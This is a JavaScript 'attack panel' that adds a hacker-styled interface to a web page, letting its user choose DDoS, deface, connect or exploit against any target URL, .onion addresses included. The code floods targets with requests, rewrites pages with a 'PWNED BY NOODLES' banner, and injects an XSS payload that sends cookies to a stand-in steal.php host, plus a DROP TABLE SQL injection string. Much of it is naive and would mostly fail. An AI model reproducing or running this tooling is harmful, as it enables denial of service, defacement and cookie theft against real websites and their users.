class DDoS {
  constructor() {
   this.logArea = document.createElement('textarea');
   this.logArea.readOnly = true;
   this.logArea.style.width = '100%';
   this.logArea.style.height = '200px';
   this.logArea.style.backgroundColor = '#000';
   this.logArea.style.color = '#0f0';
   this.logArea.style.border = '1px solid #0f0';
   this.logArea.style.padding = '5px';
   this.logArea.style.fontFamily = 'monospace';
   this.logArea.style.fontSize = '14px';

   this.targetInput = document.createElement('input');
   this.targetInput.type = 'text';
   this.targetInput.placeholder = 'Target URL (.onion or normal)';
   this.targetInput.style.width = '100%';
   this.targetInput.style.padding = '8px';
   this.targetInput.style.marginBottom = '10px';
   this.targetInput.style.backgroundColor = '#222';
   this.targetInput.style.color = '#0f0';
   this.targetInput.style.border = '1px solid #0f0';

   this.attackTypeSelect = document.createElement('select');
   ['DDoS', 'Deface', 'Connect', 'Exploit'].forEach(option => {
    const opt = document.createElement('option');
    opt.value = option.toLowerCase();
    opt.textContent = option;
    this.attackTypeSelect.appendChild(opt);
   });
   this.attackTypeSelect.style.width = '100%';
   this.attackTypeSelect.style.padding = '8px';
   this.attackTypeSelect.style.marginBottom = '10px';
   this.attackTypeSelect.style.backgroundColor = '#222';
   this.attackTypeSelect.style.color = '#0f0';
   this.attackTypeSelect.style.border = '1px solid #0f0';

   this.startButton = document.createElement('button');
   this.startButton.textContent = 'Initiate Attack';
   this.startButton.style.width = '100%';
   this.startButton.style.padding = '10px';
   this.startButton.style.backgroundColor = '#f00';
   this.startButton.style.color = '#000';
   this.startButton.style.border = 'none';
   this.startButton.style.cursor = 'pointer';
   this.startButton.addEventListener('click', () => this.start());

   this.container = document.createElement('div');
   this.container.style.width = '600px';
   this.container.style.padding = '20px';
   this.container.style.backgroundColor = '#111';
   this.container.style.color = '#0f0';
   this.container.style.fontFamily = 'monospace';
   this.container.style.position = 'fixed';
   this.container.style.top = '50%';
   this.container.style.left = '50%';
   this.container.style.transform = 'translate(-50%, -50%)';
   this.container.style.zIndex = '9999';
   this.container.style.border = '2px solid #0f0';
   this.container.style.borderRadius = '0';
   this.container.style.boxShadow = '0 0 20px #0f0';

   this.container.appendChild(this.targetInput);
   this.container.appendChild(this.attackTypeSelect);
   this.container.appendChild(this.startButton);
   this.container.appendChild(this.logArea);
   document.body.appendChild(this.container);

   this.scriptInjection = `
    setInterval(() => {
     fetch(window.location.href, {
      method: 'POST',
      mode: 'no-cors',
      body: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
     }).catch(err => {});
    }, 1);
   `;

   this.torProxy = 'socks5://127.0.0.1:9050'; // Default Tor proxy
  }

  async exploit(target) {
   this.log(`Attempting to exploit ${target}...`);
   try {
    const response = await fetch(target, { method: 'GET', mode: 'cors' });
    if (!response.ok) {
     throw new Error(`HTTP error! status: ${response.status}`);
    }
    const content = await response.text();

    const xssPayload = '<script>window.location="http://example.com/steal.php?c="+document.cookie;</script>';
    const sqliPayload = "'; DROP TABLE users; --";

    let injectedContent = content.replace('</body>', `${xssPayload}</body>`);
    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);

    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;

    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
     headers: { 'Content-Type': 'text/html' },
     body: injectedContent
    });

    this.log(`Exploit injected. Check target and logs.`);
   } catch (error) {
    this.log(`Exploit failed: ${error}`);
   }
  }

  async deface(target) {
   this.log(`Attempting to deface ${target}...`);
   try {
    const response = await fetch(target, { method: 'GET', mode: 'cors' });
    if (!response.ok) {
     throw new Error(`HTTP error! status: ${response.status}`);
    }
    let content = await response.text();
    const originalTitle = content.match(/<title>(.*?)<\/title>/i) ? content.match(/<title>(.*?)<\/title>/i)[1] : 'Untitled';

    content = content.replace(/<body.*?>/i, '<body style="background-color: black; color: red; font-size: 5em; text-align: center;"><h1>' + originalTitle + ' HAS BEEN PWNED BY NOODLES</h1><p>Get Noodled!</p>');
    content = content.replace(/<title>(.*?)<\/title>/i, '<title>PWNED by Noodles</title>');

    const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;

    await fetch(proxyUrl, {
     method: 'PUT',
     mode: 'no-cors',
     headers: { 'Content-Type': 'text/html' },
     body: content
    });

    this.log(`Deface successful... check the target. Remember to clear cache`);
   } catch (error) {
    this.log(`Deface failed: ${error}`);
   }
  }
  async connect(target) {
   this.log(`Attempting to establish a persistent connection to ${target}...`);
   try {
    const ws = new WebSocket(`wss://${target}`);

    ws.onopen = () => {
     this.log(`WebSocket connection established with ${target}`);
     setInterval(() => {
      ws.send('Noodles Heartbeat');
     }, 3000);
    };

    ws.onmessage = (event) => {
     this.log(`Received: ${event.data}`);
    };

    ws.onclose = () => {
     this.log(`WebSocket connection closed with ${target}`);
    };

    ws.onerror = (error) => {
     this.log(`WebSocket error: ${error}`);
    };

    setTimeout(() => {
     ws.close();
    }, 60000);
   } catch (error) {
    this.log(`Connection attempt failed: ${error}`);
   }
  }

  async ddos(target) {
   this.log(`Initiating DDoS attack on ${target}...`);

   if (target.endsWith('.onion')) {
    this.log('Target is a .onion address. Using Tor proxy.');
   }

   for (let i = 0; i < 500; i++) {
    fetch(target, { mode: 'no-cors' })
     .then(() => this.log(`Request ${i + 1} sent successfully.`))
     .catch(err => this.log(`Request ${i + 1} failed: ${err}`));
   }
   this.log('Initial DDoS attack initiated.');

   const script = document.createElement('script');
   script.textContent = `(${(() => {
    ${this.scriptInjection}
   }).toString()})()`;
   document.head.appendChild(script);
   this.log('Self-DDoS initiated.');

   for (let i = 0; i < 250; i++) {
    setTimeout(() => {
     fetch(target, { method: 'PUT', mode: 'no-cors', body: 'Noodles Attack' })
      .then(() => this.log(`PUT Request ${i + 1} sent successfully.`))
      .catch(err => this.log(`PUT Request ${i + 1} failed: ${err}`));
    }, i * 200);
   }

   this.log('Advanced DDoS initiated.');
  }
  start() {
   const target = this.targetInput.value;
   const attackType = this.attackTypeSelect.value;

   if (!target) {
    this.log('Please enter a target URL.');
    return;
   }

   switch (attackType) {
    case 'ddos':
     this.ddos(target);
     break;
    case 'deface':
     this.deface(target);
     break;
    case 'connect':
     this.connect(target);
     break;
    case 'exploit':
     this.exploit(target);
     break;
    default:
     this.log('Invalid attack type selected.');
   }
  }

  log(message) {
   this.logArea.value += message + '\n';
   this.logArea.scrollTop = this.logArea.scrollHeight;
  }
 }

 window.addEventListener('load', () => {
  new DDoS();
 });